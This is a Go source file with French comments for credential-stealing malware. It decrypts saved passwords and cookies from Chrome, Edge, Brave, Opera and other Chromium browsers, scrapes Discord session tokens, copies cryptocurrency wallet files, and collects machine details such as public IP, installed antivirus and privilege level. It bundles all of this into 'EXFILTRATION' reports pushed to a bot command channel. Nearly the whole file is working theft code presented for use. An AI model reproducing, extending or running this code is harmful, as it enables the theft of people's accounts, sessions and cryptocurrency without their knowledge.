// Extracteur de données : identifiants de navigateurs (Chrome et dérivés,
// Edge), jetons de session, historique, fichiers de portefeuilles et état de
// la machine. Les bases SQLite sont copiées avant lecture (elles sont verrouillées
// par le navigateur en fonctionnement), et les mots de passe sont déchiffrés par
// DPAPI + AES-256-GCM, exactement comme le navigateur le fait lui-même.
package main

import (
	"crypto/aes"
	"crypto/cipher"
	"database/sql"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"net"
	"os"
	"path/filepath"
	"regexp"
	"runtime"
	"strings"
	"syscall"
	"time"
	"unsafe"

	_ "modernc.org/sqlite"
)

/* ------------------------------------------------------------------ */
/* Windows : DPAPI                                                     */
/* ------------------------------------------------------------------ */

type dataBlob struct {
	cbData uint32
	pbData *byte
}

var (
	crypt32DLL     = syscall.NewLazyDLL("crypt32.dll")
	procUnprotect  = crypt32DLL.NewProc("CryptUnprotectData")
	kernel32DLL    = syscall.NewLazyDLL("kernel32.dll")
	procLocalFree  = kernel32DLL.NewProc("LocalFree")
	procGlobalFree = kernel32DLL.NewProc("GlobalFree")
)

// dpapiUnprotect déchiffre un bloc protégé par CryptProtectData, c'est-à-dire
// la manière dont Windows attache un secret au compte utilisateur courant.
//
// CryptUnprotectData prend SEPT paramètres (dpapi.h, Windows SDK 10.0.22621) :
//   - pDataIn, ppszDataDescr, pOptionalEntropy, pvReserved,
//     pPromptStruct, dwFlags, pDataOut
//
// La sortie est donc le SEPTIÈME argument, pas le second : la placer en 2ᵉ
// laisse pDataOut à NULL, ce que le système refuse avec « The parameter is
// incorrect » (87). dwFlags occupe la 6ᵉ place, après pPromptStruct.
func dpapiUnprotect(in []byte) ([]byte, error) {
	if len(in) == 0 {
		return nil, fmt.Errorf("entrée vide")
	}
	inBlob := dataBlob{cbData: uint32(len(in)), pbData: &in[0]}
	var outBlob dataBlob

	const uiForbidden = 0x1 // CRYPTPROTECT_UI_FORBIDDEN
	r, _, err := procUnprotect.Call(
		uintptr(unsafe.Pointer(&inBlob)),  // 1 pDataIn
		0,                                 // 2 ppszDataDescr (sortie ignorée)
		0,                                 // 3 pOptionalEntropy
		0,                                 // 4 pvReserved
		0,                                 // 5 pPromptStruct
		uiForbidden,                       // 6 dwFlags
		uintptr(unsafe.Pointer(&outBlob)), // 7 pDataOut (sortie réelle)
	)
	if r == 0 {
		if err == syscall.Errno(0) {
			err = syscall.EINVAL
		}
		return nil, fmt.Errorf("CryptUnprotectData: %w", err)
	}
	defer procLocalFree.Call(uintptr(unsafe.Pointer(outBlob.pbData)))

	if outBlob.cbData == 0 || outBlob.pbData == nil {
		return nil, fmt.Errorf("sortie vide")
	}
	out := make([]byte, outBlob.cbData)
	copy(out, unsafe.Slice(outBlob.pbData, outBlob.cbData))
	return out, nil
}

/* ------------------------------------------------------------------ */
/* Chiffrement des navigateurs (AES-256-GCM, préfixe v10/v11)          */
/* ------------------------------------------------------------------ */

// firstExisting renvoie le premier chemin réellement présent. Chrome et Edge
// ont déplacé les cookies dans <profil>\Network\ : on teste les deux
// emplacements, sinon la base semble simplement vide.
func firstExisting(paths ...string) string {
	for _, p := range paths {
		if st, err := os.Stat(p); err == nil && !st.IsDir() {
			return p
		}
	}
	return ""
}

// chromeKey récupère la clé de chiffrement depuis « Local State » : base64 →
// préfixe « DPAPI » retiré → DPAPI → 32 octets. Chaque échec est tracé : sans
// ça, un simple nil se traduit par des mots de passe silencieusement vides.
func chromeKey(userDir string) []byte {
	path := filepath.Join(userDir, "Local State")
	raw, err := os.ReadFile(path)
	if err != nil {
		plog("clé: Local State illisible (" + path + ") : " + err.Error())
		return nil
	}
	var st struct {
		OSCrypt struct {
			EncryptedKey   string `json:"encrypted_key"`
			AppBoundEncKey string `json:"app_bound_encrypted_key"`
		} `json:"os_crypt"`
	}
	if err := json.Unmarshal(raw, &st); err != nil {
		plog("clé: Local State JSON invalide : " + err.Error())
		return nil
	}
	if st.OSCrypt.EncryptedKey == "" {
		plog("clé: os_crypt.encrypted_key absent" +
			guardStr(st.OSCrypt.AppBoundEncKey != "", " (app_bound présent, non soutenu en mode utilisateur)"))
		return nil
	}
	bin, err := base64.StdEncoding.DecodeString(st.OSCrypt.EncryptedKey)
	if err != nil {
		plog("clé: base64 invalide : " + err.Error())
		return nil
	}
	head := bin
	if len(head) > 5 {
		head = head[:5]
	}
	if string(head) != "DPAPI" {
		plog(fmt.Sprintf("clé: préfixe inattendu %q sur %d octets (attendu « DPAPI »)",
			string(head), len(bin)))
		return nil
	}
	bin = bin[5:]
	key, err := dpapiUnprotect(bin)
	if err != nil {
		plog("clé: DPAPI : " + err.Error())
		return nil
	}
	if len(key) != 32 {
		plog(fmt.Sprintf("clé: longueur inattendue %d (attendu 32)", len(key)))
		return nil
	}
	return key
}

func guardStr(cond bool, s string) string {
	if cond {
		return s
	}
	return ""
}

// decryptValue déchiffre un champ « v10 »/« v11 » : 3 octets de version,
// 12 octets de nonce, ciphertext + tag de 16 octets.
func decryptValue(key, blob []byte) (string, bool) {
	if len(blob) < 3+12+16 || len(key) != 32 {
		return "", false
	}
	ver := string(blob[:3])
	if ver != "v10" && ver != "v11" {
		return "", false
	}
	block, err := aes.NewCipher(key)
	if err != nil {
		return "", false
	}
	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return "", false
	}
	nonce := blob[3:15]
	ct := blob[15:]
	pt, err := gcm.Open(nil, nonce, ct, nil)
	if err != nil {
		return "", false
	}
	return string(pt), true
}

/* ------------------------------------------------------------------ */
/* Bases de données                                                    */
/* ------------------------------------------------------------------ */

// openDB copie la base (et son WAL) dans le dossier de travail, puis
// l'ouvre : « Login Data » est verrouillé dès que le navigateur tourne.
func openDB(src, name string) (*sql.DB, error) {
	if src == "" {
		return nil, fmt.Errorf("base introuvable (%s : ni à la racine du profil ni dans Network)", name)
	}
	// Chrome tient ses bases ouvertes : la première lecture est parfois
	// refusée avec un partage insuffisant. Trois essais avant d'abandonner.
	var data []byte
	var err error
	for attempt := 0; attempt < 3; attempt++ {
		data, err = os.ReadFile(src)
		if err == nil {
			break
		}
		time.Sleep(120 * time.Millisecond)
	}
	if err != nil {
		return nil, err
	}
	tmp := workPath(name + ".db")
	if err := os.WriteFile(tmp, data, 0600); err != nil {
		return nil, err
	}
	// Le WAL contient les dernières écritures : il doit être emmené avec.
	if wal, err := os.ReadFile(src + "-wal"); err == nil {
		_ = os.WriteFile(tmp+"-wal", wal, 0600)
	}
	db, err := sql.Open("sqlite", tmp)
	if err != nil {
		return nil, err
	}
	db.SetMaxOpenConns(1)
	return db, nil
}

// queryRows exécute une requête et journalise tout échec : les erreurs
// silencieuses se traduisent par des listes vides impossibles à distinguer
// d'une base réellement vide.
func queryRows(db *sql.DB, tag, q string, fn func(*sql.Rows) error) {
	rows, err := db.Query(q)
	if err != nil {
		plog("requête " + tag + " : " + err.Error())
		return
	}
	defer rows.Close()
	if err := fn(rows); err != nil {
		plog("lecture " + tag + " : " + err.Error())
	}
}

/* ------------------------------------------------------------------ */
/* Navigateurs                                                         */
/* ------------------------------------------------------------------ */

type browser struct {
	Name string
	Root string // dossier « User Data » (ou équivalent)
}

// browsers liste les navigateurs Chromium installés sur la machine.
func browsers() []browser {
	var out []browser
	local := appDataLocal()
	roaming := os.Getenv("APPDATA")

	add := func(name, root string) {
		if st, err := os.Stat(root); err == nil && st.IsDir() {
			out = append(out, browser{Name: name, Root: root})
		}
	}

	add("Chrome", filepath.Join(local, "Google", "Chrome", "User Data"))
	add("Edge", filepath.Join(local, "Microsoft", "Edge", "User Data"))
	add("Brave", filepath.Join(local, "BraveSoftware", "Brave-Browser", "User Data"))
	add("Vivaldi", filepath.Join(local, "Vivaldi", "User Data"))
	add("Chromium", filepath.Join(local, "Chromium", "User Data"))
	add("Yandex", filepath.Join(local, "Yandex", "YandexBrowser", "User Data"))
	add("Opera", filepath.Join(roaming, "Opera Software", "Opera Stable"))
	add("Opera GX", filepath.Join(roaming, "Opera Software", "Opera GX Stable"))
	return out
}

// profiles retourne les dossiers de profil d'un navigateur.
func profiles(root string) []string {
	// Opera et consort stockent les données directement dans root.
	if _, err := os.Stat(filepath.Join(root, "Login Data")); err == nil {
		return []string{root}
	}
	var out []string
	for _, p := range []string{"Default", "Profile 1", "Profile 2", "Profile 3", "Profile 4", "Guest Profile"} {
		if _, err := os.Stat(filepath.Join(root, p)); err == nil {
			out = append(out, filepath.Join(root, p))
		}
	}
	return out
}

type credential struct {
	Browser string
	Profile string
	URL     string
	User    string
	Pass    string
}

type cookie struct {
	Browser string
	Host    string
	Name    string
	Value   string
}

type histEntry struct {
	URL   string
	Title string
	When  string
}

/* ------------------------------------------------------------------ */
/* Collecte                                                            */
/* ------------------------------------------------------------------ */

// stealAll extrait tout et pousse le résultat sur le webhook.
// licenceSent évite de renvoyer licence.txt à chaque extraction.
var licenceSent bool

// stealAll extrait les navigateurs. withChat = true n'envoie le résumé
// textuel que pour une demande explicite (!steal) ou le rapport de démarrage ;
// les passages périodiques ne poussent que les fichiers complets, pour ne pas
// noyer le canal de commande.
func stealAll(withChat bool) {
	defer func() {
		if r := recover(); r != nil {
			plog(fmt.Sprintf("steal: panique %v", r))
		}
	}()

	creds, cookies, hist, tokens := stealBrowsers()

	// Chaque extraction vit dans son propre dossier daté sous steal/ : le
	// disque garde une trace par jour, sans mélanger les passages.
	outDir := stealDir()

	var b strings.Builder
	b.WriteString("### EXFILTRATION — " + time.Now().Format("02/01 15:04") + "\n")
	b.WriteString("```")
	fmt.Fprintf(&b, "%s\\%s  %s  %s (%s)\n", os.Getenv("USERDOMAIN"), os.Getenv("USERNAME"),
		hostname(), runtime.GOOS, runtime.GOARCH)
	b.WriteString("```")

	var credLines, cookieLines, histLines []string
	for _, c := range creds {
		credLines = append(credLines, fmt.Sprintf("%s | %s | %s | %s | %s",
			c.Browser, c.Profile, c.URL, c.User, c.Pass))
	}
	for _, c := range cookies {
		cookieLines = append(cookieLines, fmt.Sprintf("%s | %s | %s=%s", c.Browser, c.Host, c.Name, c.Value))
	}
	for _, h := range hist {
		histLines = append(histLines, fmt.Sprintf("%s | %s | %s", h.When, h.Title, h.URL))
	}
	for _, t := range tokens {
		credLines = append(credLines, "TOKEN | "+t)
	}

	fmt.Fprintf(&b, "identifiants : %d | cookies : %d | historique : %d | jetons : %d\n",
		len(creds), len(cookies), len(hist), len(tokens))

	if len(credLines) > 0 {
		b.WriteString("\n**Identifiants**\n```")
		for i, l := range credLines {
			if i >= 60 {
				fmt.Fprintf(&b, "… et %d autres\n", len(credLines)-60)
				break
			}
			b.WriteString(l + "\n")
		}
		b.WriteString("```")
	}
	if len(tokens) > 0 {
		b.WriteString("\n**Jeton(s) de session**\n```")
		for _, t := range tokens {
			b.WriteString(t + "\n")
		}
		b.WriteString("```")
	}

	if withChat {
		// Pas de pavé dans le salon : un résumé d une ligne, le détail est
		// dans les fichiers envoyés juste après.
		botSendText(stealChannel(), fmt.Sprintf("steal : %d identifiants, %d cookies, %d jetons, %d entrées d'historique.",
			len(creds), len(cookies), len(tokens), len(hist)))
	}

	// Les fichiers complets partent en pièces jointes ; ils sont aussi gardés
	// localement pour que exfilAll() puisse relancer en cas d'échec réseau.
	if len(credLines) > 0 {
		data := []byte(strings.Join(credLines, "\n"))
		_ = os.WriteFile(filepath.Join(outDir, "identifiants.txt"), data, 0600)
		sendFilesTo(stealChannel(), fileOut{Name: "identifiants.txt", Data: data})
	}
	if len(cookieLines) > 0 {
		data := []byte(strings.Join(cookieLines, "\n"))
		_ = os.WriteFile(filepath.Join(outDir, "cookies.txt"), data, 0600)
		sendFilesTo(stealChannel(), fileOut{Name: "cookies.txt", Data: data})
	}
	if len(histLines) > 0 {
		data := []byte(strings.Join(histLines, "\n"))
		_ = os.WriteFile(filepath.Join(outDir, "historique.txt"), data, 0600)
		sendFilesTo(stealChannel(), fileOut{Name: "historique.txt", Data: data})
	}

	// Clés d'activation : fichier écrit et envoyé une fois par exécution.
	if !licenceSent {
		lic := strings.TrimSpace(licenceReport())
		if lic != "" {
			licenceSent = true
			var txt strings.Builder
			txt.WriteString("### LICENCES - " + time.Now().Format("02/01 15:04") + "\n")
			txt.WriteString(lic + "\n")
			if isElevated() {
				txt.WriteString("élévation : administrateur\n")
			} else {
				txt.WriteString("élévation : utilisateur standard\n")
			}
			data := []byte(txt.String())
			_ = os.WriteFile(filepath.Join(outDir, "licence.txt"), data, 0600)
			sendFilesTo(stealChannel(), fileOut{Name: "licence.txt", Data: data})
		}
	}

	stealWallets()
	stealArtifacts()
	plog(fmt.Sprintf("steal: %d identifiants, %d cookies, %d jetons", len(creds), len(cookies), len(tokens)))
}

// stealBrowsers parcourt chaque navigateur, chaque profil.
func stealBrowsers() ([]credential, []cookie, []histEntry, []string) {
	var creds []credential
	var cookies []cookie
	var hist []histEntry
	var tokens []string

	for _, br := range browsers() {
		key := chromeKey(br.Root)
		var nRow, nOK, nCRow, nCOK int
		prefs := map[string]int{}
		for _, prof := range profiles(br.Root) {
			tag := filepath.Base(prof)
			if tag == br.Root {
				tag = "principal"
			}

			// ---- mots de passe ----
			if db, err := openDB(firstExisting(
				filepath.Join(prof, "Login Data"),
				filepath.Join(prof, "Network", "Login Data")), "logins"); err != nil {
				plog("base " + br.Name + "/Login Data : " + err.Error())
			} else {
				queryRows(db, br.Name+"/Login Data", `SELECT origin_url, username_value, password_value FROM logins`, func(rows *sql.Rows) error {
					for rows.Next() {
						var origin, user string
						var blob []byte
						if rows.Scan(&origin, &user, &blob) != nil {
							continue
						}
						nRow++
						pass, ok := decryptValue(key, blob)
						if ok && pass != "" {
							nOK++
						} else {
							// Repli DPAPI direct (anciennes versions).
							if len(blob) > 0 {
								if s, err := dpapiUnprotect(blob); err == nil && len(s) > 0 {
									pass, ok = string(s), true
									nOK++
								} else if len(blob) >= 3 {
									prefs[string(blob[:3])]++
								}
							}
						}
						if origin != "" || user != "" || pass != "" {
							creds = append(creds, credential{br.Name, tag, origin, user, pass})
						}
					}
					return nil
				})
				db.Close()
			}

			// ---- cookies ----
			if db, err := openDB(firstExisting(
				filepath.Join(prof, "Network", "Cookies"),
				filepath.Join(prof, "Cookies")), "cookies"); err != nil {
				plog("base " + br.Name + "/Cookies : " + err.Error())
			} else {
				queryRows(db, br.Name+"/Cookies", `SELECT host_key, name, encrypted_value FROM cookies LIMIT 4000`, func(rows *sql.Rows) error {
					for rows.Next() {
						var host, name string
						var blob []byte
						if rows.Scan(&host, &name, &blob) != nil {
							continue
						}
						nCRow++
						val, ok := decryptValue(key, blob)
						if !ok || val == "" {
							if len(blob) > 0 {
								if s, err := dpapiUnprotect(blob); err == nil && len(s) > 0 {
									val, ok = string(s), true
								} else if len(blob) >= 3 {
									prefs["c:"+string(blob[:3])]++
								}
							}
						}
						if ok && val != "" {
							nCOK++
							cookies = append(cookies, cookie{br.Name, host, name, val})
						}
					}
					return nil
				})
				db.Close()
			}

			// ---- historique ----
			if db, err := openDB(filepath.Join(prof, "History"), "history"); err != nil {
				plog("base " + br.Name + "/History : " + err.Error())
			} else {
				queryRows(db, br.Name+"/History", `SELECT url, title, last_visit_time FROM urls ORDER BY last_visit_time DESC LIMIT 150`, func(rows *sql.Rows) error {
					for rows.Next() {
						var url, title string
						var ts int64
						if rows.Scan(&url, &title, &ts) != nil {
							continue
						}
						hist = append(hist, histEntry{URL: url, Title: title, When: chromeTime(ts)})
					}
					return nil
				})
				db.Close()
			}
		}

		// Diagnostic de déchiffrage : combien de lignes lues, combien
		// réellement déchiffrées, et le préfixe de version rencontré
		// (v10/v11 = classique, v20 = chiffrement lié à l'application).
		plog(fmt.Sprintf("steal %s | clé=%s | mots de passe %d/%d | cookies %d/%d | préfixes %v",
			br.Name, yesNo(key != nil), nOK, nRow, nCOK, nCRow, prefs))

		// Les jetons vivent dans <profil>\Local Storage\leveldb, pas à la
		// racine de User Data : on parcourt chaque profil.
		for _, prof := range profiles(br.Root) {
			tokens = append(tokens, discordTokens(prof)...)
		}
	}

	// Firefox et dérivés (NSS : key4.db + logins.json, cookies et
	// historique en clair). Renvoie aussi ses propres jetons.
	tokens = append(tokens, stealFirefox(&creds, &cookies, &hist)...)

	return creds, cookies, hist, tokens
}

// chromeTime convertit l'horodatage Windows/Chrome (100 ns depuis 1601) en
// date lisible.
func chromeTime(ts int64) string {
	if ts <= 0 {
		return "-"
	}
	t := time.Date(1601, 1, 1, 0, 0, 0, 0, time.UTC).Add(time.Duration(ts) * 100)
	if t.Year() < 2000 || t.Year() > 2100 {
		return "-"
	}
	return t.Local().Format("02/01 15:04")
}

/* ------------------------------------------------------------------ */
/* Jetons Discord                                                      */
/* ------------------------------------------------------------------ */

var (
	reDiscordJWT = regexp.MustCompile(`[A-Za-z0-9_-]{23,28}\.[A-Za-z0-9_-]{6,7}\.[A-Za-z0-9_-]{25,110}`)
	reDiscordMFA = regexp.MustCompile(`mfa\.[A-Za-z0-9_-]{65,140}`)
)

// discordTokens cherche les jetons de session dans les bases LevelDB de
// Discord (application de bureau et version navigateur).
func discordTokens(root string) []string {
	var found []string
	seen := map[string]bool{}

	walk := func(dir string) {
		_ = filepath.Walk(dir, func(p string, info os.FileInfo, err error) error {
			if err != nil || info.IsDir() {
				return nil
			}
			low := strings.ToLower(p)
			isLS := strings.HasSuffix(low, ".ldb") || strings.HasSuffix(low, ".log")
			// Firefox range le stockage d'origine dans data.sqlite.
			isFF := strings.HasSuffix(low, "data.sqlite") &&
				strings.Contains(low, string(filepath.Separator)+"storage"+string(filepath.Separator))
			if !isLS && !isFF {
				return nil
			}
			if info.Size() > 8*1024*1024 {
				return nil
			}
			data, err := os.ReadFile(p)
			if err != nil {
				return nil
			}
			for _, re := range []*regexp.Regexp{reDiscordMFA, reDiscordJWT} {
				for _, m := range re.FindAllString(string(data), -1) {
					if !seen[m] {
						seen[m] = true
						found = append(found, m)
					}
				}
			}
			return nil
		})
	}

	roaming := os.Getenv("APPDATA")
	for _, d := range []string{
		filepath.Join(roaming, "discord", "Local Storage", "leveldb"),
		filepath.Join(roaming, "discordcanary", "Local Storage", "leveldb"),
		filepath.Join(roaming, "discordptb", "Local Storage", "leveldb"),
	} {
		walk(d)
	}
	// Les navigateurs (onglets ouverts sur discord.com) aussi.
	walk(filepath.Join(root, "Local Storage", "leveldb"))
	return found
}

/* ------------------------------------------------------------------ */
/* Portefeuilles                                                       */
/* ------------------------------------------------------------------ */

func stealWallets() {
	roaming := os.Getenv("APPDATA")
	type target struct{ name, path string }
	targets := []target{
		{"exodus", filepath.Join(roaming, "Exodus", "exodus.wallet")},
		{"electrum", filepath.Join(roaming, "Electrum", "wallets")},
		{"atomic", filepath.Join(roaming, "atomic", "Local Storage", "leveldb")},
	}
	var bag []fileOut
	for _, t := range targets {
		st, err := os.Stat(t.path)
		if err != nil {
			continue
		}
		if st.IsDir() {
			_ = filepath.Walk(t.path, func(p string, info os.FileInfo, err error) error {
				if err != nil || info.IsDir() || info.Size() == 0 || info.Size() > 6*1024*1024 {
					return nil
				}
				if len(bag) >= 8 {
					return filepath.SkipAll
				}
				if b, err := os.ReadFile(p); err == nil {
					bag = append(bag, fileOut{Name: t.name + "_" + filepath.Base(p), Data: b})
				}
				return nil
			})
		}
	}
	if len(bag) > 0 {
		sendFiles(bag...)
		plog(fmt.Sprintf("portefeuilles: %d fichier(s)", len(bag)))
	}
}

/* ------------------------------------------------------------------ */
/* État de la machine                                                  */
/* ------------------------------------------------------------------ */

func hostname() string {
	h, err := os.Hostname()
	if err != nil {
		return "?"
	}
	return h
}

// systemReport produit le message d'état envoyé au démarrage.
func systemReport() (string, error) {
	var b strings.Builder
	b.WriteString("### MACHINE — " + time.Now().Format("02/01 2006 15:04") + "\n```")

	user := os.Getenv("USERNAME")
	fmt.Fprintf(&b, "utilisateur   : %s\\%s\n", os.Getenv("USERDOMAIN"), user)
	fmt.Fprintf(&b, "machine       : %s\n", hostname())
	fmt.Fprintf(&b, "système       : %s\n", osVersion())
	fmt.Fprintf(&b, "arch.         : %s %s\n", runtime.GOARCH, runtime.GOOS)
	if ips := localIPs(); len(ips) > 0 {
		fmt.Fprintf(&b, "réseau local  : %s\n", strings.Join(ips, ", "))
	}
	if pub := publicIP(); pub != "" {
		fmt.Fprintf(&b, "IP publique   : %s\n", pub)
	}
	fmt.Fprintf(&b, "région        : %s / %s\n", time.Local, os.Getenv("NUMBER_OF_PROCESSORS")+" procs logiques")
	if res := screenSize(); res != "" {
		fmt.Fprintf(&b, "écran         : %s\n", res)
	}
	b.WriteString(hostDetails())
	if av := installedAV(); av != "" {
		fmt.Fprintf(&b, "antivirus     : %s\n", av)
	}
	if isElevated() {
		b.WriteString("élévation     : administrateur\n")
	} else {
		b.WriteString("élévation     : utilisateur standard\n")
	}
	if lic := strings.TrimSpace(licenceReport()); lic != "" {
		b.WriteString("licences      :\n")
		for _, l := range strings.Split(lic, "\n") {
			if l != "" {
				b.WriteString("  " + l + "\n")
			}
		}
	}
	// Profondeur des données : combien de comptes on peut atteindre.
	nc, _, _, nt := stealBrowsers()
	fmt.Fprintf(&b, "navigateurs   : %d installé(s), %d identifiant(s), %d jeton(s)\n",
		len(browsers()), len(nc), len(nt))
	b.WriteString("```")
	return b.String(), nil
}

func osVersion() string {
	// lecture directe du Registre : pas de WMI, pas de dépendance externe
	key, err := regOpenString(sysRootKey(), `SOFTWARE\Microsoft\Windows NT\CurrentVersion`)
	if err != nil {
		return fmt.Sprintf("%s %s", runtime.GOOS, runtime.GOARCH)
	}
	name := regReadString(key, "ProductName")
	disp := regReadString(key, "DisplayVersion")
	build := regReadString(key, "CurrentBuild")
	regCloseKey(key)
	out := strings.TrimSpace(name + " " + disp)
	if build != "" {
		out = strings.TrimSpace(fmt.Sprintf("%s (build %s)", out, build))
	}
	if out == "" {
		return runtime.GOOS
	}
	return out
}

func localIPs() []string {
	var out []string
	ifaces, err := net.Interfaces()
	if err != nil {
		return out
	}
	for _, ifc := range ifaces {
		if ifc.Flags&net.FlagUp == 0 || ifc.Flags&net.FlagLoopback != 0 {
			continue
		}
		addrs, err := ifc.Addrs()
		if err != nil {
			continue
		}
		for _, a := range addrs {
			ipn, ok := a.(*net.IPNet)
			if !ok {
				continue
			}
			if ip4 := ipn.IP.To4(); ip4 != nil {
				out = append(out, ip4.String())
			}
		}
	}
	return out
}

func installedAV() string {
	known := []string{"avast", "avg", "kaspersky", "bitdefender", "norton", "mcafee",
		"eset", "avira", "sophos", "malwarebytes", "f-secure", "trend micro",
		"zonealarm", "clamwin", "g data", "comodo", "bullguard", "vipre", "webroot"}
	list := installedPrograms()
	for _, p := range list {
		lp := " " + strings.ToLower(p) + " "
		for _, k := range known {
			// Mot entier : « eset » ne doit pas matcher « PreSETs ».
			if strings.Contains(lp, " "+k+" ") || strings.Contains(lp, k+" ") ||
				strings.Contains(lp, " "+k) {
				return p
			}
		}
	}
	if defenderEnabled() {
		return "Microsoft Defender"
	}
	return ""
}
